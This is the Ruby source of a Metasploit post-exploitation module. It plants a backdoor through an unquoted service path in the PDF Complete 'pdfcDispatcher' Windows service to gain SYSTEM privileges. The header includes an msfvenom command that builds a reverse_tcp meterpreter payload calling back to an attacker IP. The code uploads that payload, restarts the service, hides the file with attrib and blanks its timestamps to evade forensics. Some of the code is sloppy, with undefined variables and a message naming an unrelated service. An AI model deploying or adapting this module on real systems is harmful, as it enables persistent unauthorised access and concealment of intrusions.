##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


##
# Exploit Title  : PDF_service_backdoor.rb - 'Unquoted Service Path Privilege Escalation'
# PDF Version    : 4.1.12
# vuln Discover  : Joey Lane
# Module Author  : pedr0 Ubuntu [r00t-3xp10it]
# Tested on      : Windows 7 Professional
# Software Link  : http://www.pdfcomplete.com/cms/Downloads.aspx
# "This was tested on version 4.1.12, but other versions may be affected as well."
#
#
#
# [ DESCRIPTION ]
# PDF Complete Corporate Edition installs a service with an unquoted service path.
# This enables a local privilege escalation vulnerability. To exploit this vulnerability,
# a local attacker can insert an executable file in the path of the service.
# Rebooting the system or restarting the service will run the malicious executable
# with elevated privileges.
#
# ---------------------------------------------------------------------------
# C:\>sc qc pdfcDispatcher                                                        
# [SC] QueryServiceConfig SUCCESS                                                 
#                                                                                 
# SERVICE_NAME: pdfcDispatcher                                                    
#         TYPE               : 10  WIN32_OWN_PROCESS                              
#         START_TYPE         : 2   AUTO_START                                     
#         ERROR_CONTROL      : 1   NORMAL                                         
#         BINARY_PATH_NAME   : C:\Program Files (x86)\PDF Complete\pdfsvc.exe                                         
#         LOAD_ORDER_GROUP   :                                                    
#         TAG                : 0                                                  
#         DISPLAY_NAME       : PDF Document Manager                               
#         DEPENDENCIES       :                                                    
#         SERVICE_START_NAME : LocalSystem
# ---------------------------------------------------------------------------
# Using the BINARY_PATH_NAME listed above as an example, an executable named
# "Program.exe" could be placed in "C:\", and it would be executed as the
# Local System user next time the service was restarted.
#
# [ BUILD SERVICE EXECUTABLE ]
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=1337 -a x86 --platform windows -f exe-service -o Program.exe
#
#
#
# [ MODULE OPTIONS ]
# Input The session number to run this module on  => set SESSION 3
# Input full path of Program.exe to be uploaded   => set LOCAL_PATH /root/Program.exe
# Check pdfcDispatcher service auto-start status? => set SERVICE_STATUS true
# use attrib to hidde your program.exe in target? => set HIDDEN_ATTRIB true
# Blank remote backdoor timestomp attributs?      => set BLANK_TIMESTOMP true
# ---------------------------------------------------------------------------------------
# Deploy PDF.exe insted of Program.exe?           => set PDF_EXE true
# WARNING: advanced option 'PDF_EXE' requires user to build one 'PDF.exe' payload and use
# 'LOCAL_PATH' to deploy it (payload will be deploy in: C:\Program Files (x86)\PDF.exe
# examples: set LOCAL_PATH /root/PDF.exe AND set PDF_EXE true AND exploit
# ---------------------------------------------------------------------------------------
#
# "WARNING: This module will not delete the payload deployed"
# "WARNING: Note that only executables explicitly written to interface with the Service Control
# Manager should be installed this way. While SC will happily accept a regular non-service binary,
# you will receive the fatal Error 1053 when you attempt to start the service, please read the follow
# article: http://www.howtogeek.com/50786/using-srvstart-to-run-any-application-as-a-windows-service
#
#
# [ PORT MODULE TO METASPLOIT DATABASE ]
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/escalate/PDF_service_backdoor.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/escalate/PDF_service_backdoor.rb
# Manually Path Search: root@kali:~# locate modules/post/windows/escalate
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > reload_all
# msf exploit(handler) > use post/windows/escalate/PDF_service_backdoor
# msf post(PDF_service_backdoor) > info
# msf post(PDF_service_backdoor) > show options
# msf post(PDF_service_backdoor) > show advanced options
# msf post(PDF_service_backdoor) > set [option(s)]
# msf post(PDF_service_backdoor) > exploit
#
#
# [ FINAL NOTES ]
# This Post-exploitation module only accepts 'Program.exe'
# Or 'PDF.exe' (advanced option) payloads to be upload...
##



# ----------------------------
# Module Dependencies/requires
# ----------------------------
require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'



# ----------------------------------
# Metasploit Class name and includes
# ----------------------------------
class MetasploitModule < Msf::Post
      Rank = ExcellentRanking
 
         include Msf::Post::Common
         include Msf::Post::Windows::Priv



# -----------------------------------------
# Building Metasploit/Armitage info GUI/CLI
# -----------------------------------------
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'PDF complete - Unquoted Service Path backdoor',
                        'Description'   => %q{
                                        This post-exploitation module requires a meterpreter session to be able to upload/inject our Program.exe into pdfcDispatcher service. PDF Complete Corporate Edition installs a service with an unquoted service path. This enables a local privilege escalation vulnerability. To exploit this vulnerability, a local attacker can insert an executable file in the path of the service. Rebooting the system or restarting the service will run the malicious executable with elevated privileges. "Warning: payload to be uploaded should be named as: Program.exe"
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Vuln discover: Joey Lane',    # vulnerability discover
                                        'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                        # 'Special thanks:', # testing/debug module
                                ],
 
                        'Version'        => '$Revision: 1.4',
                        'DisclosureDate' => 'nov 18 2016',
                        'Platform'       => 'windows',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'true', # requires elevated privileges
                        'Targets'        =>
                                [
                                         # Tested againts windows 7 (32 bits) | XP SP1 (32 bits)
                                         [ 'Windows XP', 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 9', 'Windows 10' ]
                                ],
                        'DefaultTarget'  => '3', # default its to run againts windows 7 (32 bits)
                        'References'     =>
                                [
                                         [ 'URL', 'goo.gl/Etf934' ],
                                         [ 'URL', 'goo.gl/U54297' ],
                                         [ 'URL', 'http://sourceforge.net/users/peterubuntu10' ],
                                         [ 'URL', 'http://sourceforge.net/projects/msf-auxiliarys/repository' ]
                                ],
			'DefaultOptions' =>
				{
                                         'SESSION' => '1', # Default its to run againts session 1
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptString.new('LOCAL_PATH', [ false, 'The full path of Program.exe to be uploaded']),
                                OptBool.new('SERVICE_STATUS', [ false, 'Check remote pdfcDispatcher service settings?' , false]),
                                OptBool.new('BLANK_TIMESTOMP', [ false, 'Blank remote backdoor timestomp attributs?' , false]),
                                OptBool.new('HIDDEN_ATTRIB', [ false, 'Use Attrib command to Hide Program.exe?' , false])
                        ], self.class)

                register_advanced_options(
                        [
                                OptBool.new('PDF_EXE', [ false, 'Deploy PDF.exe insted of Program.exe payload?' , false])
                        ], self.class)
 
        end




# ----------------------------------------------
# Check for proper target Platform (win32|win64)
# ----------------------------------------------
def unsupported
   session = client
     sys = session.sys.config.sysinfo
       print_warning("[ABORT]: Operative System => #{sys['OS']}")
       print_error("Only windows systems are supported by this module...")
       print_error("Please execute [info] for further information...")
       print_line("")
   raise Rex::Script::Completed
end




# ----------------------------------------------------------
# UPLOAD OUR EXECUTABLE INTO pdfcDispatcher BINARY_PATH_NAME
# ----------------------------------------------------------
def ls_stage1

  r=''
  session = client
  u_path = datastore['LOCAL_PATH']
  bin_path = "%programfiles(x86)%\\PDF Complete\\pdfsvc.exe"
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options...
  if datastore['LOCAL_PATH'] == 'nil'
    print_error("Options not configurated correctly...")
    print_warning("Please set LOCAL_PATH option!")
    return nil
  else
    print_status("Deploying backdoor into target system!")
    sleep(1.0)
  end

  # chose to deploy payload in C:\  -> [C:\Program.exe] OR ...
  # to deploy payload in C:\Program Files (x86)  -> [C:\Program Files (x86)\PDF.exe]
  if datastore['PDF_EXE'] == true
   payload = "%programfiles(x86)%\\PDF.exe"
   shell = "PDF.exe"
  else
   payload = "C:\\Program.exe"
   shell = "Program.exe"
  end

    # check if vulnerable service (executable) exists
    if client.fs.file.exist?("#{bin_path}")
      print_warning("pdfcDispatcher service:found")
      sleep(1.0)
      print_good("Stoping pdfcDispatcher service...")
      # stop service to enable proper configuration
      r = session.sys.process.execute("cmd.exe /c sc stop pdfcDispatcher", nil, {'Hidden' => true, 'Channelized' => true})
      sleep(2.5)
        print_good("Set service to auto-start with windows...")
        # set service to auto-start with windows
        r = session.sys.process.execute("cmd.exe /c sc config pdfcDispatcher start= auto obj= LocalSystem", nil, {'Hidden' => true, 'Channelized' => true})
        sleep(1.0)

          # upload our executable into temp foldder
          print_good("Uploading payload to target system...")
          client.fs.file.upload("%temp%\\#{shell}","#{u_path}")
          sleep(2.0)

        # move payload to the rigth directory (unquoted service path)
        print_good("moving payload to #{payload}")
        r = session.sys.process.execute("cmd.exe /c move /y %temp%\\#{shell} #{payload}", nil, {'Hidden' => true, 'Channelized' => true})
        sleep(1.0)

          # start remote service ...
          print_good("Restarting pdfcDispatcher service...")
          r = session.sys.process.execute("cmd.exe /c sc start pdfcDispatcher", nil, {'Hidden' => true, 'Channelized' => true})
          sleep(2.0)

        # task completed successefully...
        print_warning("Unquoted service path vulnerability backdoor deployed!")
        sleep(1.0)
        print_status("Setup one handler and Wait everytime that system restarts OR")
        print_status("Setup one handler and restart NoIPDUCService4 service: sc start NoIPDUCService4")
        print_line("")

    else
      print_error("ABORT: post-module cant find service binary...")
      print_error("NOT_FOUND: #{service_path}")
      print_line("")
    end

    # close channel when done
    r.channel.close
    r.close

  # error exception funtion
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end




# -------------------------------------------------
# USE ATTRIB COMMAND TO HIDDE PROGRAM.EXE (PAYLOAD)
# -------------------------------------------------
def ls_stage2

  r=''
  session = client
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options...
  if datastore['HIDDEN_ATTRIB'].blank?
    print_error("Options not configurated correctly...")
    print_warning("Please set HIDDEN_ATTRIB option!")
    return nil
  else
    print_status("Using Attrib command to hide backdoor!")
    sleep(1.0)
  end

  # chose to deploy payload in C:\  -> [C:\Program.exe] OR ...
  # to deploy payload in C:\Program Files (x86)  -> [C:\Program Files (x86)\PDF.exe]
  if datastore['PDF_EXE'] == true
   payload = "%programfiles(x86)%\\PDF.exe"
   shell = "PDF.exe"
  else
   payload = "C:\\Program.exe"
   shell = "Program.exe"
  end

    # check if backdoor.exe exist on target
    if client.fs.file.exist?("#{payload}")
      print_status("Backdoor agent: #{shell} found!")
      sleep(1.0)
      # change attributes of backdoor to hidde it from site...
      r = session.sys.process.execute("cmd.exe /c attrib +h +s #{payload}", nil, {'Hidden' => true, 'Channelized' => true})
      print_good(" Execute => cmd.exe /c attrib +h +s #{payload}")
      sleep(2.0)

        # diplay output to user
        print_status("Our #{bin_shell} its hidden from normal people!")
        print_status("Just dont feed the black hacker within :( ")
        print_line("")

      # close channel when done
      r.channel.close
      r.close

    else
      print_error("ABORT: post-module cant find backdoor agent...")
      print_error("BACKDOOR_AGENT: #{payload}")
      print_line("")
    end


  # error exception funtion
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end




# -------------------------------------------
# CHECK/DISPLAY pdfcDispatcher SERVICE STATUS
# -------------------------------------------
def ls_stage3

  r=''
  s_key = "Start"
  session = client
  b_key = "ImagePath"
  o_key = "ObjectName"
  d_key = "DisplayName"
  e_cont = "1   NORMAL"
  s_name = "pdfcDispatcher"
  s_type = "10  WIN32_OWN_PROCESS"
  sysnfo = session.sys.config.sysinfo
  hklm = "HKLM\\System\\CurrentControlSet\\services\\#{s_name}"
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options...
  if datastore['SERVICE_STATUS'].blank?
    print_error("Options not configurated correctly...")
    print_warning("Please set SERVICE_STATUS option!")
    return nil
  else
    print_status("Checking pdfcDispatcher service settings!")
    sleep(1.0)
  end

    print_warning("Reading service hive registry keys...")
    sleep(1.0)
    # search in target regedit for service existence
    if registry_enumkeys("HKLM\\System\\CurrentControlSet\\services\\#{s_name}")
      print_good("Remote service: #{s_name} found!")
      remote_service = "#{s_name}"
      sleep(1.0)
    else
      print_error("ABORT: post-module cant find service in regedit...")
      print_warning("enter into a shell session and execute: sc qc #{s_name}")
      print_line("")
      print_line("")
      # display remote service current settings...
      # cloning SC qc <ServiceName> display outputs...  
      print_line("SERVICE_NAME: #{s_name}")
      print_line(" [SC] Query Service Failed 404: NOT FOUND")
      print_line("")
      print_line("")
    return nil
    end


      # search in target regedit for service auto-start status
      # Value:Start - dword: 2 - auto | 3 - manual | 4 - disabled
      local_machine_value = registry_getvaldata(hklm,s_key)
        if local_machine_value.nil? || local_machine_value == 0
         start_up = ""
         print_error("post-module cant define service auto_start status...")
         print_warning("enter into a shell session and execute: sc qc #{s_name}")
         sleep(1.0)
          elsif local_machine_value == 2
            start_up = "2   AUTO_START"
          elsif local_machine_value == 3
            start_up = "3   DEMAND_START"
          elsif local_machine_value == 4
            start_up = "4   DISABLED_START"
        else
          start_up = ""
          print_error("post-module cant define service auto_start status...")
          print_warning("enter into a shell session and execute: sc qc #{s_name}")
          sleep(1.0)
        end


    # search in regedit for privileges (LocalSystem)
    priv_machine_value = registry_getvaldata(hklm,o_key)
      if priv_machine_value.nil?
       obj_name = ""
       print_error("post-module cant define service privileges...")
       print_warning("enter into a shell session and execute: sc qc #{s_name}")
       sleep(1.0)
      else
        obj_name = "#{priv_machine_value}"
      end


    # search in regedit for service DisplayName
    display_name_value = registry_getvaldata(hklm,d_key)
      if display_name_value.nil?
       display_name = ""
       print_error("post-module cant define service display name...")
       print_warning("enter into a shell session and execute: sc qc #{s_name}")
       sleep(1.0)
      else
        display_name = "#{display_name_value}"
      end


    # search in regedit for binary_path_name value
    bin_path_value = registry_getvaldata(hklm,b_key)
      if bin_path_value.nil?
       bin_path = ""
       print_error("post-module cant define service binary_path_name...")
       print_warning("enter into a shell session and execute: sc qc #{s_name}")
       sleep(1.0)
      else
        bin_path = "#{bin_path_value}"
      end


    sleep(1.0)
    print_line("")
    print_line("")
    # display remote service current settings...
    # cloning SC qc <ServiceName> display outputs...  
    print_line("SERVICE_NAME: #{remote_service}")
    print_line("        TYPE               : #{s_type}")
    print_line("        START_TYPE         : #{start_up}")
    print_line("        ERROR_CONTROL      : #{e_cont}")
    print_line("        BINARY_PATH_NAME   : #{bin_path}")
    print_line("        LOAD_ORDER_GROUP   :")
    print_line("        TAG                : 0")
    print_line("        DISPLAY_NAME       : #{display_name}")
    print_line("        DEPENDENCIES       :")
    print_line("        SERVICE_START_NAME : #{obj_name}")
    print_line("")
    print_line("")

  # error exception funtion
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end



# -------------------------------
# BLANK BACKDOOR TIMESTOMP VALUES
# -------------------------------
def ls_stage4

  r=''
  session = client
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options...
  if datastore['BLANK_TIMESTOMP'].blank?
    print_error("Options not configurated correctly...")
    print_warning("Please set BLANK_TIMESTOMP option!")
    return nil
  else
    print_status("Blank backdoor timestamp attributes!")
    sleep(1.5)
  end

  # to deploy payload in C:\Program Files (x86)  -> [C:\Program Files (x86)\PDF.exe]
  if datastore['PDF_EXE'] == true
   payload = "%programfiles(x86)%\\PDF.exe"
   shell = "PDF.exe"
  else
   payload = "C:\\Program.exe"
   shell = "Program.exe"
  end

    # check if backdoor.exe exist in target
    if client.fs.file.exist?("#{payload}")
      print_good(" Backdoor agent: #{shell} found!")
      sleep(1.5)

      # Change payload timestamp (date:time)
      print_good(" Blanking backdoor agent timestamp...")
      client.priv.fs.blank_file_mace("#{payload}")
      sleep(1.5)

        # diplay output to user
        print_status("#{shell} timestomp successefully blanked!")
        print_line("")

      # close channel when done
      r.channel.close
      r.close

    else
      print_error("ABORT: post-module cant find backdoor agent path...")
      print_error("BACKDOOR_AGENT: #{payload}")
      print_line("")
    end

  # error exception funtion
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end



# ------------------------------------------------
# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
# Running sellected modules against session target
# ------------------------------------------------
def run
  session = client
    # Check for proper target Platform
    unsupported if client.platform !~ /win32|win64/i

      # Variable declarations (msf API calls)
      sysnfo = session.sys.config.sysinfo
      runtor = client.sys.config.getuid
      runsession = client.session_host
      directory = client.fs.dir.pwd


    # Print banner and scan results on screen pdfcDispatcher
    print_line("    +----------------------------------------------+")
    print_line("    | PRIVILEGE ESCALATION IN PDFDISPACHER SERVICE |")
    print_line("    |     Author: Pedro Ubuntu [ r00t-3xp10it ]    |")
    print_line("    +----------------------------------------------+")
    print_line("")
    print_line("    Running on session  : #{datastore['SESSION']}")
    print_line("    Computer            : #{sysnfo['Computer']}")
    print_line("    Operative System    : #{sysnfo['OS']}")
    print_line("    Target IP addr      : #{runsession}")
    print_line("    Payload directory   : #{directory}")
    print_line("    Client UID          : #{runtor}")
    print_line("")
    print_line("")


    # check for proper session.
    if not sysinfo.nil?
      print_status("Running module against: #{sysnfo['Computer']}")
    else
      print_error("ABORT]:This post-module only works in meterpreter sessions")
      raise Rex::Script::Completed
    end
    # elevate session privileges befor runing options
    client.sys.config.getprivs.each do |priv|
    end

 
# ------------------------------------
# Selected settings to run
# ------------------------------------
      if datastore['LOCAL_PATH']
         ls_stage1
      end

      if datastore['HIDDEN_ATTRIB']
         ls_stage2
      end

      if datastore['SERVICE_STATUS']
         ls_stage3
      end

      if datastore['BLANK_TIMESTOMP']
         ls_stage4
      end
   end
end
